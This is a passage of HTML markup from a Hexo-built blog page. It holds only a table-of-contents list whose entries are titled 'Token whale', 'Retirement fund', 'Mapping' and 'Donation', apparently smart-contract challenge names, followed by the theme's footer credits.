sale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Token-whale"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.Token whale</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Retirement-fund"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.Retirement fund</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Mapping"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.Mapping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Donation"><span class="toc-number">2.0.5.</span> <span class="toc-text">5.Donation</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>